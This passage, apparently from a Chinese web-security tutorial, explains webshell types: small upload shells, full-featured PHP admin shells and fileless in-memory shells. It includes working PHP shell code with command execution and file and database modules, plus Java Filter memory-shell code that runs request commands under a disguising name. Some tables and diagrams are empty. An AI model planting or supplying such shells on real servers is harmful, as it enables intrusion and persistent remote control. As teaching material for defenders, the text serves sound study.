        $_FILES['f']['name']
    );
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="f">
    <input type="submit" value="upload">
</form>
```

**小马的特点：**

```
┌──────────────────────────────────────────────────────┐
│  优点                    │  缺点                      │
├──────────────────────────┼────────────────────────────┤
│  ✅ 体积极小（几字节~几百字节） │  ❌ 功能单一         │
│  ✅ 难以被特征检测发现    │  ❌ 操作不便              │
│  ✅ 不易被肉眼注意到      │  ❌ 无可视化界面          │
│  ✅ 适合作为初始落脚点    │  ❌ 需配合客户端工具       │
└──────────────────────────┴────────────────────────────┘
```

---

### 大马（Big Shell / Full-featured Shell）

**定义：** 功能完整的 Web 管理界面，通常包含文件管理、数据库操作、命令执行、端口扫描等多种功能，提供**图形化操作界面**。

**大马的典型功能模块：**

```
┌─────────────────────────────────────────────────────────────┐
│                       大马功能全景                            │
├───────────────────┬─────────────────────────────────────────┤
│  文件管理          │  浏览/创建/删除/复制/移动/压缩/下载文件   │
│  代码执行          │  命令行执行、PHP 代码执行                 │
│  数据库管理        │  连接 MySQL/MSSQL，执行 SQL 语句          │
│  端口扫描          │  扫描内网主机开放端口                    │
│  信息收集          │  系统信息/PHP 配置/环境变量/当前路径      │
│  提权辅助          │  常见提权漏洞检测                        │
│  反弹 Shell        │  建立反向连接到攻击者                    │
│  代理功能          │  Socks 代理，内网穿透                    │
└───────────────────┴─────────────────────────────────────────┘
```

**大马代码框架示意（PHP）：**

```php
<?php
// ── 大马基础框架 ──
session_start();

// 简单密码验证
$password = "p@ssw0rd";
if(!isset($_SESSION['auth'])){
    if($_POST['pass'] !== $password){
        // 显示登录表单
        echo '<form method="post">
                <input type="password" name="pass">
                <input type="submit" value="Login">
              </form>';
        exit;
    }
    $_SESSION['auth'] = true;
}

// ── 功能路由 ──
$action = $_GET['action'] ?? 'info';

switch($action){
    case 'cmd':
        // 命令执行模块
        $output = shell_exec($_POST['command']);
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
        break;
        
    case 'file':
        // 文件管理模块
        $dir = $_GET['dir'] ?? '.';
        $files = scandir($dir);
        foreach($files as $file){
            $path = $dir . '/' . $file;
            echo "<a href='?action=file&dir=$path'>$file</a><br>";
        }
        break;
        
    case 'db':
        // 数据库模块
        $conn = mysqli_connect(
            $_POST['host'], $_POST['user'],
            $_POST['pass'], $_POST['dbname']
        );
        $result = mysqli_query($conn, $_POST['sql']);
        // 输出查询结果...
        break;
        
    case 'info':
    default:
        // 系统信息
        phpinfo();
        break;
}
?>
```

### 小马 vs 大马 综合对比

```
┌─────────────────┬────────────────────────┬────────────────────────┐
│  对比维度        │  小马                   │  大马                  │
├─────────────────┼────────────────────────┼────────────────────────┤

│  常用组合方式    │  先传小马获权限          │  再用小马传入大马        │
└─────────────────┴────────────────────────┴────────────────────────┘
```

**实战使用顺序：**

```

        ↓

        ↓

```

## 5.4 内存马简介

### 什么是内存马

内存马（Memory WebShell / Fileless WebShell）是一种**不写入磁盘文件**的 WebShell，将恶意代码直接注入到 Web 应用程序的**运行时内存**中，依托 Web 容器的内存常驻机制实现持久化。

```
┌─────────────────────────────────────────────────────────────┐
│              传统 WebShell vs 内存马                         │
├──────────────────────┬──────────────────────────────────────┤
│   传统 WebShell       │   内存马                             │
├──────────────────────┼──────────────────────────────────────┤
│  存在于磁盘文件中      │  只存在于进程内存中                  │
│  重启后仍存在          │  服务重启后消失（需重新注入）          │
│  可被文件扫描检测      │  ❌ 文件扫描完全无效                  │
│  有明确的文件路径      │  无文件路径，无法通过文件找到          │
│  .php/.asp/.jsp 文件  │  注入到框架/容器的内存对象中           │
└──────────────────────┴──────────────────────────────────────┘
```

### 内存马的分类

#### Java 内存马（最成熟）

Java Web 容器（Tomcat/Spring 等）提供了大量可动态注册的组件，均可被用于注入内存马。

```
┌─────────────────────────────────────────────────────────────┐
│                   Java 内存马分类                            │
├──────────────────┬──────────────────────────────────────────┤
│  类型             │  注入机制                               │
├──────────────────┼──────────────────────────────────────────┤
│  Servlet 型      │  动态注册 Servlet，响应特定 URL 请求      │
│  Filter 型       │  注册过滤器，拦截所有请求执行代码         │
│                  │  （最常用，无需特定URL）                  │
│  Listener 型     │  注册监听器，监听 Session/Request 事件   │
│  Agent 型        │  利用 Java Attach API 注入 JVM           │
│  Spring MVC 型   │  动态注册 Controller 或 Interceptor      │
│  Websocket 型    │  注册 Websocket Handler                  │
└──────────────────┴──────────────────────────────────────────┘
```

**Filter 型内存马核心原理（伪代码）：**

```java
// 通过反射获取 Web 容器内部的 StandardContext 对象
StandardContext ctx = getStandardContext();

// 动态创建一个 Filter（过滤器）
Filter maliciousFilter = (request, response, chain) -> {
    // 获取请求参数
    String cmd = ((HttpServletRequest) request).getParameter("cmd");
    if (cmd != null) {
        // 执行系统命令
        Process p = Runtime.getRuntime().exec(cmd);
        // 将结果写入响应
        InputStream is = p.getInputStream();
        response.getOutputStream().write(is.readAllBytes());
        return; // 不继续传递请求
    }
    chain.doFilter(request, response);
};

// 将 Filter 动态注册到容器（内存级别，无需修改任何文件）
FilterDef filterDef = new FilterDef();
filterDef.setFilter(maliciousFilter);
filterDef.setFilterName("securityFilter");  // 伪装成安全过滤器
ctx.addFilterDef(filterDef);

// 添加 FilterMap（拦截所有路径）
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("securityFilter");
filterMap.addURLPattern("/*");
ctx.addFilterMapBefore(filterMap);
```

```python
# Flask 内存马：动态添加路由
from flask import Flask, request
```
